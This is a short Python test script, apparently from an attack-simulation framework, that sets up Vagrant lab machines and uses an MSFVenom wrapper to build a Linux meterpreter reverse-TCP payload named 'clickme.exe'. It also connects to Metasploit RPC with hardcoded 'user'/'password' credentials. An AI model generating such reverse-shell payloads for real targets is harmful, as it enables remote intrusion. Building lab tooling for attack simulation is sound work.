from app.machinecontrol import Machine
from app.attack_log import AttackLog
from app.metasploit import MSFVenom, Metasploit


# For some local tests
if __name__=="__main__":


    # msfrpcd -S -P password -u user -f
    attacker_ip = "192.168.178.125"
    # target_ip = "192.168.178.125"

    # Metasploit RPC
    password = "password"
    user = "user"

    attack_logger = AttackLog(0)
    attacker = Machine({"root": "systems/attacker1",
                         "os": "linux",
                         "vm_controller": {
                             "type": "vagrant",
                             "vagrantfilepath": "systems",
                             "ip": attacker_ip
                         },
                         "vm_name": "attacker1"}, attack_logger)

    # Target machine is attacker machine here
    target = Machine({"root": "systems/attacker1",
                        "os": "linux",
                        "vm_controller": {
                            "type": "vagrant",
                            "vagrantfilepath": "systems",
                            "ip": attacker_ip
                        },
                        "vm_name": "attacker1"}, attack_logger)

    venom = MSFVenom(attacker, target)
    print(venom.generate_cmd(payload="linux/x64/meterpreter_reverse_tcp",
                             architecture="x64",
                             platform="linux",
                             # lhost,
                             format="elf",
                             outfile="clickme.exe"))

    metasploit = Metasploit(password, server=attacker.get_ip(), username=user)
    # client = MsfRpcClient('yourpassword', ssl=True)